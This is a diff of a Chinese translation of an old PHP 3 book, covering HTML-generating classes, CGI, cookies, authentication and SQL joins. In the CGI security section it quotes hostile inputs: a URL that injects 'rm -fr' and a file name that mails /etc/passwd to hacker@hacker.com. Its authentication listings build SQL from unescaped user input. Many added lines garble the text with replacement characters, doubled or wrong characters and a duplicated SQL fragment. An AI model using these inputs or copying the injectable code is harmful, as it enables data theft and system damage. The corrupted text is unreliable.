@@ -7758,82 +9031,129 @@ HTML 标签不需要属性，也不能包含其他组件。然而，它们包含
 **列表 11.8** cls_title.inc——支持 title 标签
 
 ```php
+
 <?php // cls_title.inc
+
 class cls_title extends cls_htmlbase {
+
     function cls_title($in_props = array()) {
+
     $this->cls_htmlbase(array(
+
         'tag_name' => 'title'
+
     ));
+
     }
+
 }
+
 ?>
+
 ```
 
 现在可以将 `fifth.php3` 复制到 `sixth.php` 并使用以下代码生成 HTML 页面：
 
 ```php
+
 require("cls_htmlbase.inc");
 
 $html = new cls_html();
+
 $head = new cls_head();
+
 $body = new cls_body();
 
 // 创建 title 对象并将页面// 标题添加到新对象中。
+
 $title = new cls_title();
+
 $title->add("PHP Module");
+
 ```
 
 ```php
+
 // 将 title 对象添加到 head 对象中。
+
 $head->add($title);
 
 $html->add($head);
+
 $html->add($body);
 
 $buffer = htmlspecialchars($html->generate());
+
 echo $buffer;
+
 ```
 
 驱动代码（`sixth.php`）中的 `require` 语句数量开始失控，因此它们被移动到了 `cls_htmlbase.inc` 文件的末尾。眼不见为心不在——对吧？这段驱动代码显示为：
 
 ```html
+
 <!DOCTYPE PUBLIC "-//W3C//DTD HTML 3.2//EN">
+
 <html>
+
 <head><title></title></head>
+
 <body></body>
+
 </html>
+
 ```
 
 title 标签显示了，但内部包含的字符串没有显示。发生了什么？如果我们检查 `htmlbase_generate` 方法中处理内容的部分，就能看到问题所在：
 
 ```php
+
 $contents = $this->props['contents'];
+
 while (list($key, $value) = each($contents)) {
+
     $buffer .= $value->generate();
+
 }
+
 ```
 
 啊。看到问题了吗？问题是粗体文本中的代码。`while` 循环将所有包含的项目视为对象。而 title 对象使用字符串来持有标题文本。坦率地说，PHP 有一套完整的变量相关函数。在这种情况下，我们只需要一个：如果 `is_object` 函数被添加到 `while` 循环中，它看起来像这样：
 
 ```php
+
 $contents = $this->props['contents'];
+
 while (list($key, $value) = each($contents)) {
+
   if (is_object($value)) {
+
     $buffer .= $value->generate();
+
   } else {
+
     $buffer .= $value;
+
   }
+
 }
+
 ```
 
 重新加载 `sixth.php` 后，它现在显示为：
 
 ```html
+
 <!DOCTYPE PUBLIC "-//W3C//DTD HTML 3.2//EN">
+
 <html>
+
 <head><title>PHP Module</title></head>
+
 <body></body>
+
 </html>
+
 ```
 
 
@@ -7849,71 +9169,119 @@ while (list($key, $value) = each($contents)) {
 有些人可能会说，我查看注释标签的方式不对。他们可能会认为这并不是一个开始标签、内容和一个结束标签，而是一个单一的标签。虽然他们可能是的，但这一点无关紧要。在我看来，正确的观点是任何能让代码运行的方法！对于我们的目的而言，使用开始标签和结束标签运行良好。
 
 ```php
+
 <?php // cls_htmlbase.inc
 
 class cls_htmlbase {
+
     var $props =
 
     var $defaults = array(
+
         'tag_name' => '',
+
         'start_tag' => '',
+
         'end_tag' => '',
+
         'endtag' => '1',
+
         'bln_closebracket' => '1',
+
         'attributes' => array(
+
         'contents' => array()
+
     );
-    
+
     function cls_htmlbase($in_props) {
+
         // ...
+
         // 如果参数中没有指定值，则将 tag_name 属性
+
         // 赋值给 start_tag 和 end_tag。
+
         $start_tag = $this->props['start_tag'];
+
         if (empty($start_tag)) {
+
             $this->props['start_tag'] = $this->props['tag_name'];
+
         }
+
         $end_tag = $this->props['end_tag'];
+
         if (empty($end_tag)) {
+
             $this->props['end_tag'] = $this->props['tag_name'];
+
 ```
 
 ## 添加注释支持
 
 ```php
+
 // ...
+
 )
+
 function validate_attribute_name($name) {
+
 // ...
+
 }
+
 function htmlbase_generate() {
+
 $bln_closebracket = $this->props['bln_closebracket'];
+
 $start_tag = $this->props['start_tag'];
+
 $end_tag = $this->props['end_tag'];
 
 $buffer = "<$start_tag";
 
 // ...
+
 if ($bln_closebracket == '1') {
+
   $buffer .= ">";
+
 }
 
 // ...
+
 if ($this->props['bln_endtag'] == '1') {
+
   if ($bln_closebracket == '1') {
+
     $buffer .= "</";
+
   }
+
   $buffer .= "$end_tag>";
+
 }
 
 return($buffer);
+
 }
+
 // ... ...
+
 require("cls_html.inc");
+
 require("cls_head.inc");
+
 require("cls_body.inc");
+
 require("cls_title.inc");
+
 require("cls_comment.inc");
+
 ?>
+
 ```
 
 注释类如列表 11.09所示。
@@ -7921,37 +9289,57 @@ require("cls_comment.inc");
 ## 列表 11.9 cls_comment.inc—支持注释标签
 
 ```php
+
 <?php // cls_comment.inc
 
 class cls_comment extends cls_htmlbase {
 
 function cls_comment($in_props = '') {
+
     $this->_cls_htmlbase(array(
+
         'tag_name'       => 'comment',
+
         'start_tag'      => '<!--',
+
         'end_tag'        => '--',
+
         'bln_closebracket' => '0'
+
     ));
+
 }
+
 ?>
+
 ```
 
 驱动文件（现在更名为 seventh.php3）需要在头部对象初始化之后放置以下几行：
 
 ```php
+
 $comment = new cls_comment();
+
 $comment->add("This is an HTML comment.");
+
 $body->add($comment);
+
 ```
 
 添加此内容后，脚本现在可以正常显示注释标签了。
 
 ```html
+
 <!DOCTYPE PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
+
 <html>
+
 <head><title>PHP HTML Module</title></head>
+
 <body><!--This is an HTML comment.------></</body>>
+
 </html>
+
 ```
 
 ## 添加通用标签的支持
@@ -7963,16 +9351,20 @@ $body->add($comment);
 与其创建一个标题对象，你可以创建一个 `htmlbase` 对象：
 
 ```php
+
 $title = new cls_htmlbase(array(
+
   'tag_name' => 'title'
+
 ));
+
 ```
 
 `$title` 对象的行为与之前相同，它可以使用相同的属性和方法。唯一的区别是，不再创建一个标题对象，而是创建了一个 `htmlbase` 对象。
 
 当然，这种技术也有一些缺点：
 
-- 标签属性无法进行验证。由于 `$valid_attributes` 数组对每个标签来说都是唯一的，因此每个需要验证的标签都必须有自己的类。
+- 标�属性无法进行验证。由于 `$valid_attributes` 数组对每个标签来说都是唯一的，因此每个需要验证的标签都必须有自己的类。
 - 无法满足特殊需求，例如在 HTML 标签之前支持 doctype 标签。
 - 标签的处理方式不统一。如果使用 `htmlbase` 类来创建对象，用户需要记住哪些标签有自己的类，哪些标签使用 `htmlbase`。给程序员增加这种认知负担会导致错误。
 
@@ -7985,14 +9377,19 @@ $title = new cls_htmlbase(array(
 ## 保存（或缓存）HTML
 
 ```php
+
 return($value);
+
 }
 
 $html = add_to_cache($dbname, $id_link);
+
 echo $html;
 
 @mysql_close($id_link);
+
 ?>
+
 ```
 
 如果一切运行正常，这段代码将显示：
@@ -8007,47 +9404,70 @@ echo $html;
 ## 列表 11.13 php3—从缓存获取 HTML
 
 ```php
+
 <?php
+
 require("common.inc");
+
 require("cls_htmlbase.inc");
 
 function make_html() {
+
     // ...
+
 }
 
 function add_to_cache($dbname, $id_link) {
+
     // ...
+
 }
 
 function test_cache($dbname, $id_link) {
+
     $name = 'font01';
 
     $str_sql = "
+
     SELECT value
+
 FROM html_cache
+
 WHERE name = '$name'
+
 ";
 
 $result = mysql_db_query($dbname, $str_sql, $id_link);
 
 if ($result) {
+
 echo "Generating HTML<br>";
+
 $value = add_to_cache($dbname, $id_link);
+
 } else {
+
 echo "From Cache<br>";
+
 $record = @mysql_fetch_object($result);
+
 $value = $record->value;
+
 }
+
 return($value);
 
 $html = test_cache($dbname, $id_link);
+
 echo $html;
 
 @mysql_close($id_link);
-?>
-```
 
-> 注意 此处开发的代码是不完整的。例如，如果你的 $name 变量包含单引号，SQL 将无法正确执行。使用 PHP 中找到 `addslashes` 函数（例如 `$name = addslashes($name)`）来解决此问题。
+?>
+
+
+
+> 注意 此处开发的代码是不完整的。例如，如果你的 `$name` 变量包含单引号，SQL 将无法正确执行。使用 PHP 中找到 `addslashes` 函数（例如 `$name = addslashes($name)`）来解决此问题。
 
 ## 总结
 
@@ -8089,10 +9509,6 @@ CGI 标准允许广泛的应用。例如：
 
 你可以使用任何编程语言编写 CGI 程序。在下一章中，你将学习如何使用 PHP 创建你的第一个 CGI 程序。
 
-
-
-
-
 # 自制脚本还是现成脚本？
 
 我鼓励你使用能够找到的任何预写脚本。例如，PHPLIB 模块被广泛使用。然而，许多程序员发现，对于某些 CGI 应用来说，这些模块大材小用。另一个需要考虑的观点是，除非脚本有良好的支持或者已经存在了一段时间，否则你会发现自己处于一种令人尴尬的境地：调试另一个程序员的代码——而且你还拿不到报酬。
@@ -8121,7 +9537,7 @@ Web 服务器通常配置为 CGI 应用只能在指定的目录中执行。这�
 http://localhost/cgi-bin/test.php3
 ```
 
-Web 服务器执行你的 CGI 脚本，任何输出都由你的 Web 浏览器显示。你 CGI 程序的 URL 是虚拟路径。脚本在 Web 服务器上的实际位置取决于服务器软件的配置和使用的计算机类型。例如，如果你的电脑运行着 Linux 操作系统和“标准”配置的 Apache Web 服务器，那么绝对虚拟路径将翻译为 /usr/local/apache/cgi-bin/test.php3。如果你在 Windows 95 下运行（来自 O'Reilly 的）Web 服务器，翻译后的路径可能是 /website/cgi-bin-sh/test.php3。
+Web 服务器执行你的 CGI 脚本，任何输出都由你的 Web 浏览器显示。你 CGI 程序的 URL 是虚拟路径。脚本在 Web 服务器上的实际位置取决于服务器软件的配置和使用的计算机类型。例如，如果你的电脑运行着 Linux 操作系统和“标准”配置的 Apache Web 服务器，那么绝对虚拟路径将翻译为 `/usr/local/apache/cgi-bin/test.php3`。如果你在 Windows 95 下运行（来自 O'Reilly 的）Web 服务器，翻译后的路径可能是 `/website/cgi-bin-sh/test.php3`。
 
 如果你自己安装并管理着 Web 服务器，你可能知道将脚本存放在哪里。如果你在使用服务提供商的 Web 服务器，请询问服务器管理员将脚本存放在哪里，以及如何在你的文档中引用它们。
 
@@ -8131,7 +9547,7 @@ Web 服务器执行你的 CGI 脚本，任何输出都由你的 Web 浏览器显
 - HTML 表单上的按钮。
 - 服务器端包含（server-side include）。
 
-有趣的是，你可以通过在标准 URL 中添加额外信息来向你的 CGI 程序传递信息。例如，如果你的 CGI 程序用于用于搜索网站，你可以传递一些信息来指定要搜索哪个目录。下面的 HTML 超链接调用了一个搜索脚本，并告诉它搜索 (/root/document 目录)：
+有趣的是，你可以通过在标准 URL 中添加额外信息来向你的 CGI 程序传递信息。例如，如果你的 CGI 程序用于用于搜索网站，你可以传递一些信息来指定要搜索哪个目录。下面的 HTML 超链接调用了一个搜索脚本，并告诉它搜索 (`/root/document` 目录)：
 
 ```html
 <A HREF="cgi-bin/search.php?root/document">
@@ -8149,7 +9565,7 @@ Web 服务器执行你的 CGI 脚本，任何输出都由你的 Web 浏览器显
 </A>
 ```
 
-问号后面的信息可以通过 QUERY_STRING 环境变量供 CGI 程序使用。使用这两种方法中的任何一种都可以让你创建合法的 CGI 请求。通过提前创建这些请求，你可以减少用户可能可能的拼写错误。在本章稍后的部分，“CGI 和环境变量”部分将讨论你可以在 CGI 程序内部使用的所有环境变量。
+问号后面的信息可以通过 QUERY_STRING 环境变量供 CGI 程序使用。使用这两种方法中的任何一种都可以让你创建合法的 CGI 请求。通过提前创建这些请请求，你可以减少用户可能的拼写错误。在本章稍后的部分，“CGI 和环境变量”部分将讨论你可以在 CGI 程序内部使用的所有环境变量。
 
 通常情况下，你网站的访问者永远不应该手动输入 CGI 程序的 URL。应该始终提供超文本链接来启动程序。
 
@@ -8209,12 +9625,6 @@ phpinfo();
 
 此代码段显示了脚本定义的所有 PHP 变量。尽管并不是所有变量都是 CGI 变量，但大多数都是。一些可能的环境变量显示在表 12.2 中。
 
-
-
-
-
-## CGI 与环境变量
-
 ## 表 12.2 选定的 CGI 环境变量
 
 | 变量名 | 描述 |
@@ -8233,7 +9643,7 @@ phpinfo();
 |---|---|
 | HTTP_FROM | 提供用户的电子邮件。并非所有的 Web 浏览器都会向服务器提供此信息。因此，仅使用此字段为 HTML 表单提供默认值。 |
 | QUERY_STRING | 使用表单处理的 GET 方法时，可选包含表单信息。QUERY_STRING 也用于将搜索关键词等信息传递给 CGI 脚本。PHP 程序员通常不需要此变量，因为他们可以使用 `$HTTP_GET_VARS` 数组。 |
-| PATH_INFO | 可选地包含来自调用脚本的 HTTP 请求的任何额外路径信息。 |
+| PATH_INFO | 可选地包含来自调用脚本的 HTTP 请的任何额外路径信息。 |
 | PATH_TRANSLATED | 将脚本的虚拟路径（即从服务器目录根开始）映射到调用脚本的物理路径。 |
 | REMOTE_ADDR | 包含用户的点分十进制地址。 |
 | REMOTE_HOST | 可选地提供用户连接的站点的域名。 |
@@ -8251,7 +9661,7 @@ phpinfo();
 
 这些环境变量中的每一个都可以作为普通的 PHP 变量。例如，你可以使用 `$PHP_SELF` 来确定当前脚本的文件。使用 `$PHP_SELF` 可能会让你的程序健壮性降低，因为 `$PHP_SELF` 可能会被更改——即使是无意中。如果你需要确保获取环境变量的真实值，请在 PHP 中这样使用 `getenv` 函数：
 
-```
+```php
 $PHP_SELF = getenv("PHP_SELF");
 ```
 
@@ -8314,9 +9724,6 @@ http://www.foo.com/cgi-bin/dirlist.php/; rm -fr-
 
 另一个安全漏洞与使用外部数据打开或创建文件有关。某些进取的黑客可以使用 `mail hacker@hacker.com < /etc/passwd` 作为文件名，将你的密码文件或其他任何文件邮件给自己。
 
-
-
-
 所有的安全漏洞都可以通过使用 PHP 的 escapeshellcmd 函数移除危险字符（如 `l` 或管道字符 `|`）来避免。它的用法如下：
 
 ```php
@@ -8362,23 +9769,18 @@ Web 服务器使用 `HTTP_COOKIE` 环境变量将 cookie 信息传递给 CGI 程
 
 ```php
 <?php // cookie.php3
-
 // 删除一个 cookie。
 setCookie('userid');
-
 // 设置 cookie 的值。
 setCookie('user', 'wasaldo');
-
 // 设置 cookie 在 4 小时后超时。
 // 时间参数以秒为单位。
 setCookie('gender', 'male', time()+14400);
-
 // 创建一个仅允许 phpbook 目录下的脚本读取的 cookie。
 setCookie('car',
 'honda:accord:88:LXI:green',
 'time()+14400',
 './phpbook/');
-
 // 设置完成后，可以使用普通的 PHP 变量访问 cookies。
 echo "user: <b>user$user;</b><br>";
 echo "car: <b>car$car;</b><br><br>";
@@ -8390,9 +9792,6 @@ echo "car: <b>car$car;</b><br><br>";
 在使用 cookie 时可能遇到的一个困难是并不是每个浏览器都支持它们。如果你在使用 cookie，你需要一种用户友好的方法来告诉访客他们尝试使用的功能对他们不可用。
 
 进一步的困难在于，你设置的 cookie 无法被当前会话访问。（等等，原文说的是 "current"，但上下文暗示是 session）。我们遵循原文：你设置的 cookie 无法被当前访问。
-
-
-
 
 # 调试 CGI 程序
 
@@ -8415,7 +9814,6 @@ http: [Tue Jun 22 20:48:11 1999] [error] BAD Status
 
 ```php
 <?php // error.php3
-
 function error_exit($message) {
     header("Content-type: text/html\n");
     echo "<HTML>\n";
@@ -8427,11 +9825,9 @@ function error_exit($message) {
     echo "</HTML>\n";
     exit();
 }
-
 if ($some_variable != 'ADD') {
     error_exit("This script only processes ADD commands");
 }
-
 ?>
 ```
 
@@ -8503,7 +9899,6 @@ HTML 表单旨在让用户向 Web 服务器发送数据。这通常通过使用 
 </form>
 ```
 
-
 最后两种输入类型是复选框（checkbox）和单选按钮（radio buttons）。复选框允许用户表示两种响应中的任意一种。表单上的框要么被选中，要么未被选中。复选框的含义完全取决于你放在其相邻的文本。当用户可以勾选任意他们喜欢的项目时，就会使用复选框。例如：
 
 ```
@@ -8540,7 +9935,7 @@ CPU Type:<BR>
 </SELECT>
 ```
 
-你可以使用 `SELECTED` 修饰符将其中一个选项设置为默认值。当你有三个或更多选项可以选择时，下拉列表非常有用。如果较少，请考虑使用单选按钮。`<SELECT>` 标签具有额外的选项，可以为你提供更大的灵活性。
+你可以使用 `SELECTED` 修饰符将其中一个选项设置为默认值。当你有三个或更多选项可以选择时，下拉列表非常有用。如果较少，请考虑使用单选按钮。`<SELECT>` 标签具有额的选项，可以为你提供更大的灵活性。
 
 我们应该讨论的最后一个表单元素是文本框。你可以使用 `<TEXTAREA>..</TEXTAREA>` 标签创建多行输入字段或文本框。`<TEXTAREA>` 标签需要 `ROWS` 和 `COLS`。你可以更改 `<textarea>..</textarea>` 标签内文本框的任何默认文本。
 
@@ -8582,18 +9977,15 @@ POST 方法使用 `STDIN` 文件句柄将所有表单信息发送到 CGI 程序�
 
 在这些介绍性注释之后，有趣的开始了。展示了 CGI 程序是通过 URL 调用的。URL 可以直接输入 Web 浏览器，或存储在 Web 页面中作为超文本链接或 HTML 表单信息的目的地。我们了解到任何 CGI 程序的第一行输出必须是某种类型的 HTTP 头部。
 
-
-
-
 ## 身份验证
 
-身份验证是验证用户是否有效以及是否具有访问受保护资源的相应权限的过程。在 Web 应用程序的上下文中，身份验证允许开发者将某些文档、目录甚至整个 Web 应用程序的访问权限限制给具有正确用户名和密码的人。身份验证专家 Brad Morton 对本章做出了重大贡献。
+身份验证是验证用户是否有效以及是否具有访问受保护资源的相应权限的过程。在 Web 应用程序的上下文中，身份验证允开发者将某些文档、目录甚至整个 Web 应用程序的访问权限限制给具有正确用户名和密码的人。身份验证专家 Brad Morton 对本章做出了重大贡献。
 
 ## 316 第 13 章 / 身份验证
 
 身份验证是今天互联网上运行的大多数规模 Web 应用程序中不可或缺的一部分。对安全的需求促使开发者设计出验证客户端用户的方法。实现身份验证的方法从简单到复杂应有尽。这些包括
 
-- htaccess——以分级方式保护文档和目录。该技术由 Web 服务器实现；你只需要指定用户名并决定要保护哪些目录。
+- htaccess——以分级方式保护文档和目录。该技术由 Web 服务器实现；你只需要指指定用户名并决定要保护哪些目录。
 - 数据库表——使用你设计的任何类型的身份验证系统来保护任何类型的资源。在本章中，将展示简单的用户名和密码保护方法。
 
 这些形式的身份验证可以单独使用，也可以在某些情况下结合使用。本章中使用的代码非常简单。你可能需要对其进行修改以便用于生产环境。
@@ -8606,7 +9998,7 @@ POST 方法使用 `STDIN` 文件句柄将所有表单信息发送到 CGI 程序�
 
 HTTP 身份验证规范定义了一个简单的挑战/响应方案，供 Web 服务器用于验证用户的授权情况。如果用户尝试访问受保护的资源，Web 服务器要求返回一个 401 HTTP 状态响应头（意味着“未授权”）。此响应包含身份验证方案（Basic 或 Digest）和域名称（realm）。Basic 身份验证本质上涉及未加密的密码，而 Digest 身份验证则对其进行加密。域名称代表受保护的资源，并帮助用户记住应该使用哪个用户名和密码。在收到 401 错误后，浏览器会向用户显示一个输入用户名和密码的对话框。如果身份验证方案是 Basic，浏览器将再次请求资源，这次返回一个授权请求头，其中包含方案名称以及经过 base64 编码的用户名和密码。如果服务器不接受授权，它将响应另一个 401 错误，“授权被拒绝”或“需要授权”。浏览器可能会提示用户再次尝试输入用户名和密码。如果服务器接受授权，请求的页面将发送到用户的浏览器。对于所有后续请求，浏览器都会发送授权头，允许用户查看同一域内的 Web 页面，而无需为每个页面都登录。这种方式的缺点是，很难强制浏览器提示新的用户名和密码。
 
-PHP 将身份验证信息存储在三个变量中：$PHP_AUTH_USER、$PHP_AUTH_PW 和 $PHP_AUTH_TYPE。目前，仅支持 Basic 身份验证。通过使用 PHP 中的 `header` 函数并对这些变量进行操作，可以实现简单形式的身份验证。列表 13.1 中的脚本向用户提供了一个请求用户名和密码的对话框。该对话框还指定了受保护的域或资源。脚本随后会检查用户名和密码并将它们打印到屏幕上。显然，这没什么用，因为没有执行任何操作，但它展示了 PHP 如何操作 HTTP 头部来利用 HTTP 身份验证。在章的后半部分，你将看到一个如何将 HTTP 身份验证与数据库检查相结合以验证客户端用户名和密码的示例。
+PHP 将身份验�信息存储在三个变量中：$PHP_AUTH_USER、$PHP_AUTH_PW 和 $PHP_AUTH_TYPE。目前，仅支持 Basic 身份验证。通过使用 PHP 中的 `header` 函数并对这些变量进行操作，可以实现简单形式的身份验证。列表 13.1 中的脚本向用户提供了一个请求用户名和密码的对话框。该对话框还指定了受保护的域或资源。脚本随后会检查用户名和密码并将它们打印到屏幕上。显然，这没什么用，因为没有执行任何操作，但它展示了 PHP 如何操作 HTTP 头部来利用 HTTP 身份验证。在章的后半部分，你将看到一个如何将 HTTP 身份验证与数据库检查相结合以验证客户端用户名和密码的示例。
 
 ## 列表 13.1 auth01.php
 
@@ -8617,8 +10009,7 @@ PHP 将身份验证信息存储在三个变量中：$PHP_AUTH_USER、$PHP_AUTH_P
     echo "Authorization Required!\n";
     echo 'Hit reload to try again.';
     exit;
-}
-else {
+} else {
     echo "Username: $PHP_AUTH_USER<p>";
     echo "Password: $PHP_AUTH_PW<p>";
     echo "Auth Type: $PHP_AUTH_TYPE<p>";
@@ -8641,32 +10032,25 @@ else {
 <?php
 function fetch_page($host, $user, $password) {
     global $errno, $errstr;
-
     $buffer = "";
     $fp = fsockopen($host, 80, $errno, $errstr);
-
     if ($fp) {
         $auth_string = base64_encode($user.":".$password);
         fputs($fp,"GET / HTTP/1.0\n\n");
         fputs($fp,"Authorization: Basic $auth_string\n\n");
-
         while(!feof($fp)) {
             $buffer .= fgets($fp,1024);
         }
         close($fp);
     }
-
     $temp = preg_match("/^(.+)/ms", $buffer, $matches);
     $headers = $matches[1];
-
     $page = preg_replace("/^(.+?)<!DOCTYPE>(.*?)/ims", "\2", $buffer);
-
     return(array(
         'headers' => $headers,
         'page' => $page
     ));
 }
-
 $ary_page = fetch_page(
     "www.bogus-server.com",
     "/Admin/",
@@ -8700,7 +10084,6 @@ exit();
 
 用户数据库是一个简单的文本文件。文件的每行包含一个用户名，后面跟着一个冒号和加密后的密码。它是
 
-
 # htaccess 认证
 
 使用 `htpasswd` 程序创建。以下命令将创建一个新的用户文件并添加用户“eugene”：
@@ -8732,22 +10115,20 @@ require valid-user
 ```
 
 - **AuthName**—此指令指定了领域名称。这通常描述了你正尝试保护的内容，例如网站的管理部分或开发区域等。
-
 - **AuthType**—此指令指定了用于身份验证的协议。*Basic*（基础）认证将用户名和密码以非加密的形式（即明文）传递给 Web 服务器。这不是最安全的身份验证形式，因此得有此名。*Digest*（摘要）认证是另一种身份验证形式。它使用 MD5 加密来提供更高的密码安全性。然而，旧版本的浏览器不支持 Digest 认证，这限制了它在大型互联网网站中的使用。要使用 Digest 认证，请像设置 Basic 认证那样设置 Web 服务器，但你需要使用 `AuthType Digest` 和 `AuthDigestFile` 代替 `AuthUserFile`。
-
 - **UserFile (or AuthDigestFile)**—此指令指定了用户数据库文件的路径。这就是之前使用 `htpasswd` 创建的文件。
-
 - **require**—此指令指定了用户数据库文件中的哪些用户有权访问受保护的目录。在上面的示例中，所有有效用户都可以访问受限区域。要限制特定用户的访问，你可以修改 `require` 指令如下所示：
 
 ```
 require user gerry
 ```
 
-这允许用户 *gerry* 使用其用户名和密码访问此领域，并拒绝所有其他人，即使他们在用户数据库文件中具有有效的用户名和密码。
+这允许用户 *gerry* 使用其用户名和密量访问此领域，并拒绝所有其他人，即使他们在用户数据库文件中具有有效的用户名和密码。
 
 用户文件适用于数量较少的用户；然而，当人数增加时，它可能会变得难以管理。将用户分类为组可以极大地简化中等数量用户的管理，因为你可以在组文件中一次性为许多用户分配访问权限。
 
 组定义在 .htaccess 文件或 `<Directory>` 指令中引用的组文件中，格式如下：
+
 ```
 AuthGroupFile /etc/httpd/groups
 ```
@@ -8771,9 +10152,6 @@ require group csupp
 这允许用户 gerry 以及客户支持组（group csupp）中的所有用户使用他们正确的用户名和密码组合访问受保护区域。
 
 随着用户数量的增加，Web 服务器验证用户文件中每个用户所需的时间随之增加。在 Web 服务器频繁验证用户的大型、更活跃的网站上，迁移到更高效的身份验证方案是一个好主意。这意味着使用真实的数据库来存储用户名和密码，而不是上述示例中使用的文本文件中的用户名密码列表。
-
-
-
 
 ```html
 <form>
@@ -8804,7 +10182,6 @@ require group csupp
 
 ```php
 <?php // authenticate.inc
-
 if (!isset($_PHP_AUTH_USER)) {
   header('WWW-Authenticate: Basic realm="Example Admin Site');
   header('HTTP/1.0 401 Unauthorized');
@@ -8815,9 +10192,9 @@ if (!isset($_PHP_AUTH_USER)) {
   // 现在验证用户名和密码
   mysql_connect("hostname","username","password")
   or die("Unable to connect to database!");
-
   mysql_select_db("dbname")
   or die("Unable to select database!");
+}
 ```
 
 ```php
@@ -8826,35 +10203,29 @@ select id
 from tblusers
 where username = '$PHP_AUTH_USER'
 and password = '$PHP_AUTH_PW";
-
 $result = mysql_query($query);
 $numRows = mysql_numrows($result);
 mysql_close();
-
 if ($numRows != 1) {
   // 身份验证失败。发送身份验证请求
   header('WWW-Authenticate: Basic realm="Example Admin Site""');
   header('HTTP/1.0 401 Unauthorized');
   echo 'Authorization Required!&nbsp;';
   echo 'Hit the reload button to try again.';
-  exit();}?>
+  exit();?>
 ```
 
 ## 列表 13.6 index.php
 
 ```php
 <?php
-
 // 确保用户已身份验证
 require("authenticate.inc");
-
 echo '<HTML><HEAD>';
 echo '<TITLE>Authentication Example</TITLE>';
 echo '</HEAD><BODY>';
-
 echo "Hi $PHP_AUTH_USER !";
 echo 'You have successfully authenticated.';
-
 echo '</</body>></html>';
 ?>
 ```
@@ -8891,7 +10262,7 @@ Brad Morton 目前在 G.Triad Development Corp. 担任高级网络工程师。�
 
 大多数身份验证的实现使用两种主要方法之一（有时是两者的结合）；HTTP 身份验证头和数据库身份验证。
 
-HTTP 头部用于客户端和服务器之间的通信。当访问资源（如 Web 页面）需要身份验证时，Web 服务器会发送 401 响应头。此响应包含一个领域（realm）名称。领域名称代表受保护的资源，并帮助用户记住应该使用哪个用户名和密码。
+HTTP 头部用于客户端和服务器之间的通信。当访问资源（如 Web 页面）需要身份验证时，Web 服务器会发送 401 响应头。此响应包含一个领域（realm）名称。领域名称代表受保抚的资源，并帮助用户记住应该使用哪个用户名和密码。
 
 由于 HTTP 是无状态协议——它不会记住从一个请求到另一个请求的信息——大多数应用程序会将身份验证与某种形式的会话管理相结合。会话在用户连接到您的 Web 服务器并在一段时间结束后（通常为一到四小时）。每当用户请求 Web 页面时，计时器就会重置为零。代表会话的某种用户 ID 存储在用户的计算机上（使用 cookie）或通过 URL 传递。
 
@@ -8945,10 +10316,6 @@ Brad Morton 目前在 G.Triad Development Corp. 担任高级网络工程师。�
 
 书籍拥有作者还是作者编写书籍？显然，这两种关系是互惠的。从信息的角度来看，你通过数据库表所表示的关系是无关紧要的。然而，这个问题具有现实世界的影响。如果你的业务是一家作家经纪公司，你的重点是作者，因此关系是“作者编写书籍”。如果你是一个图书馆，你的重点是书籍；因此关系是“书籍拥有作者”。始终记住关注应用程序用户需要看到的信息。让你的数据库设计反映出对你的客户（无论是内部还是外部）最重要的内容。
 
-
-
-
-
 当我们创建一个用于维护信息的应用程序时，我们这种简单的三表数据库设计可能会变得更加复杂。例如，你是否需要一个表来存储用于输入验证的状态名称？那么像“Mr.”和“Mrs.”这样的头衔呢——它们真的重要吗？
 
 为了简单起见，在本章的剩余部分，我们将继续使用这个三表的数据库设计，如图 14.1 所示。它展示了表名、字段名以及它们之间的关系。请注意，作者表和出版社表之间没有直接关系，它们仅通过书籍表中的记录建立相关联。
@@ -8976,8 +10343,7 @@ CREATE TABLE
 
 ```sql
 CREATE TABLE
-authors
-(
+authors (
   key_authors INT(5) DEFAULT '0' NOT NULL AUTO_INCREMENT,
   author_name VARCHAR(50) NOT NULL,
   author_phone VARCHAR(20) NOT NULL,
@@ -8987,8 +10353,7 @@ authors
 
 ```sql
 CREATE TABLE
-books
-(
+books (
   key_books int(5) DEFAULT '0' NOT NULL AUTO_INCREMENT,
   key_authors int(5) DEFAULT '0' NOT NULL,
   key_publishers int(5) DEFAULT '0' NOT NULL,
@@ -9121,10 +10486,6 @@ where
   states.state = companies.state
 ```
 
-
-
-
-
 ## 使用链接表
 
 不再需要指向作者表的指针了。`books_authors` 表中的值已经满足了这一需求。列表 14.5 显示了更改 `books` 表并插入适当数据的 SQL 语句。
@@ -9135,26 +10496,19 @@ where
 
 ```sql
 ALTER TABLE books DROP key_authors
-
 INSERT INTO books
 (book_title, key_publishers)
 VALUES ('The Death of Sleep', 5)
-
 INSERT INTO books_authors
 (key_books, key_authors) VALUES (1, 3)
-
 INSERT INTO books_authors
 (key_books, key_authors) VALUES (2, 1)
-
 INSERT INTO books_authors
 (key_books, key_authors) VALUES (3, 1)
-
 INSERT INTO books_authors
 (key_books, key_authors) VALUES (4, 2)
-
 INSERT INTO books_authors
 (key_books, key_authors) VALUES (5, 4)
-
 INSERT INTO books_authors
 (key_books, key_authors) VALUES (5, 5)
 ```
@@ -9214,8 +10568,6 @@ books.book_title
 ## 第 14 章 / 战中的 SQL
 
 ## 此 SQL 的结果为
-
-
 
 | book_title | number_of_authors |
 |---|---|
@@ -9344,6 +10696,20 @@ number_of_authors > 1
 
 此 SQL 语句执行得更快，因为只连接了两个表。
 
+
+
+WHERE `books_authors`.`key_books` = `books`.`key_books`
+
+GROUP BY
+
+`books`.`book_title`
+
+HAVING
+
+`number_of_authors` > 1
+
+此 SQL 语句执行得更快，因为只连接了两个表。
+
 ## 提示
 
 从查询中消除所有不需要的表。
@@ -9362,23 +10728,23 @@ MySQL 手册第 7.12 节列出了它支持的七种连接。虽然你应该熟�
 
 ```sql
 SELECT
-books.book_title,
-COUNT(authors.author_name) AS number_of_authors
+    books.book_title,
+    COUNT(authors.author_name) AS number_of_authors
 FROM
-books
-,books_authors
-,authors
+    books,
+    books_authors,
+    authors
 WHERE
-books.key_books = books_authors.key_books
-AND books_authors.key_authors = authors.key_authors
+    books.key_books = books_authors.key_books
+    AND books_authors.key_authors = authors.key_authors
 GROUP BY
-books.book_title
+    books.book_title
 ```
 
 ## 此 SQL 的结果为
 
 | book_title | number_of_authors |
-|---|---|---|
+|---|---|
 | Eric Men at Arms Gnome Man's Land | 1 |
 | Inside-Outside | 1 |
 | The Death of Sleep | 2 |
@@ -9387,12 +10753,12 @@ books.book_title
 
 ```sql
 SELECT books.book_title,
-COUNT(authors.author_name) AS number_of_authors
-FROM books
-,books_authors
-,authors
+    COUNT(authors.author_name) AS number_of_authors
+FROM books,
+    books_authors,
+    authors
 WHERE books.key_books = books_authors.key_books
